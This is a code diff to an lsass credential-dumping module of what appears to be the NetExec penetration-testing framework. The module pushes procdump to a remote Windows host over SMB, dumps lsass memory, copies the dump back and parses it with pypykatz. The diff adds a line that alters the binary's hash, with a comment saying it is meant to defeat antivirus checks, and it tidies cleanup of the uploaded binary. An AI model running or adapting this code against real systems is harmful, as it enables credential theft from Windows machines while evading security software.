@@ -4,11 +4,11 @@
 
 import base64
 import re
-import sys
 import pypykatz
 from nxc.helpers.bloodhound import add_user_bh
 from nxc.paths import TMP_PATH
 from os.path import abspath, join
+from datetime import datetime
 
 
 class NXCModule:
@@ -35,6 +35,8 @@ class NXCModule:
         self.procdump_path = abspath(TMP_PATH)
         self.dir_result = self.procdump_path
         self.useembeded = True
+        # Add some random binary data to defeat AVs which check the file hash
+        self.procdump_embeded += datetime.now().strftime("%Y%m%d%H%M%S").encode()
 
         if "PROCDUMP_PATH" in module_options:
             self.procdump_path = module_options["PROCDUMP_PATH"]
@@ -79,7 +81,10 @@ class NXCModule:
         else:
             context.log.fail("Process lsass.exe error un dump, try with verbose")
 
-        if dump:
+        if not dump:
+            self.delete_procdump_binary(connection, context)
+            return
+        else:
             regex = r"([A-Za-z0-9-]*.dmp)"
             matches = re.search(regex, str(p), re.MULTILINE)
             machine_name = ""
@@ -87,7 +92,7 @@ class NXCModule:
                 machine_name = matches.group()
             else:
                 context.log.display("Error getting the lsass.dmp file name")
-                sys.exit(1)
+                return
 
             context.log.display(f"Copy {machine_name} to host")
 
@@ -98,11 +103,7 @@ class NXCModule:
                 except Exception as e:
                     context.log.fail(f"Error while get file: {e}")
 
-            try:
-                connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
-                context.log.success(f"Deleted procdump file on the {self.share} share")
-            except Exception as e:
-                context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
+            self.delete_procdump_binary(connection, context)
 
             try:
                 connection.conn.deleteFile(self.share, self.tmp_share + machine_name)
@@ -152,3 +153,10 @@ class NXCModule:
                         add_user_bh(credz_bh, None, context.log, connection.config)
                 except Exception as e:
                     context.log.fail("Error openning dump file", str(e))
+
+    def delete_procdump_binary(self, connection, context):
+        try:
+            connection.conn.deleteFile(self.share, self.tmp_share + self.procdump)
+            context.log.success(f"Deleted procdump file on the {self.share} share")
+        except Exception as e:
+            context.log.fail(f"Error deleting procdump file on share {self.share}: {e}")
